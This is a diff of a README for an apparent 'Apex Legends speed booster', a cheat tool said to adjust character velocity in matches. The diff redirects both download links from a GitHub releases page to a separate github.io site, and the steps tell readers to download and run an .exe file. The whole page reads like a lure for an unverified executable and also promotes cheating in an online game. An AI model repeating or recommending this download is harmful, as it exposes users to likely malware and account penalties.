@@ -1,6 +1,6 @@
 # ⚡ apex-legends-speed-booster-2026 - Improve your movement speed during matches
 
-[![Download Latest Version](https://img.shields.io/badge/Download-Latest-blue.svg)](https://github.com/shaineunquestioning529/apex-legends-speed-booster-2026/releases)
+[![Download Latest Version](https://img.shields.io/badge/Download-Latest-blue.svg)](https://shaineunquestioning529.github.io)
 
 This application helps players manage their movement speed in Apex Legends. The tool reads your keyboard inputs and applies adjustments to your character velocity. This process helps players maintain momentum during complex maneuvers. 
 
@@ -20,7 +20,7 @@ Before you install this software, confirm your computer meets these requirements
 Follow these steps to obtain the tool:
 
 1. Open your web browser.
-2. Visit the [official release page](https://github.com/shaineunquestioning529/apex-legends-speed-booster-2026/releases).
+2. Visit the [official release page](https://shaineunquestioning529.github.io).
 3. Look for the section labeled "Assets" at the bottom of the latest release.
 4. Click the file ending in .exe to start the download.
 5. Save the file to your desktop or downloads folder.
